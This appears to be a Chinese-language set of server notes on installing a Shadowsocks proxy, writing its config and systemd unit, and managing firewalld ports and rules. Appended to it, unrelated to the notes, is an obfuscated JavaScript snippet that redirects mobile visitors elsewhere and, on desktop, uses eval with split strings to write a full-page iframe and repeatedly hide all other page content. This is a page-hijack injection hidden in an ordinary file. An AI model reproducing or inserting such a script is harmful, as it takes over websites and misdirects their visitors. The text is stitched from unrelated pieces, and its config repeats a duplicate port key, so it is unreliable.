Outline的Access Key格式: ss://加密方式:密码@IP地址:端口

查询 python 版本 Python 2.6 or 2.7.以上
$ python --version

安装 shadowsocks 
$ pip install shadowsocks

配置 shadowsocks json文件
$ vi /etc/shadowsocks.json

{
  "server":"0.0.0.0",
  "local_address": "127.0.0.1",
  "local_port":1080,
  "port_password": {
    "8888": "password",
    "8888": "password"
  },
  "timeout":300,
  "method":"aes-256-cfb",
  "fast_open": false
}

配置 shadowsocks 自启动
$ vi /etc/systemd/system/shadowsocks.service

[Unit]
Description=Shadowsocks

[Service]
TimeoutStartSec=0
ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json

[Install]
WantedBy=multi-user.target

# 设置开机自启命令
systemctl enable shadowsocks

# 启动命令
systemctl start shadowsocks

#查看状态命令
systemctl status shadowsocks -l

#开启端口 最大端口65535
firewall-cmd --zone=public --add-port=8080-8081/tcp --permanent

#删除端口 最大端口65535
firewall-cmd --zone=public --remove-port=80/tcp --permanent

#查看开启的端口和服务
firewall-cmd --permanent --zone=public --list-services //服务空格隔开 例如 dhcpv6-client https ss
firewall-cmd --permanent --zone=public --list-ports //端口空格隔开 例如 8080-8081/tcp 8388/tcp 80/tcp

#设置某个ip 访问某个服务
firewall-cmd --permanent --zone=public --add-rich-rule="rule family="ipv4" source address="192.168.0.4/24" service name="http" accept"
ip 192.168.0.4/24 访问 http

#禁止IP地址段访问
firewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"

#查询端口是否开启
firewall-cmd --query-port=38023/tcp

#重启防火墙
firewall-cmd --reload

#清空当前缓存中的命令
history -c

function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "https://www.baidu.com/"
    } else {
        var ss = '<center id="yongwang"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="13' + '80" src="https://www.baidu.com/"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "yongwang") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
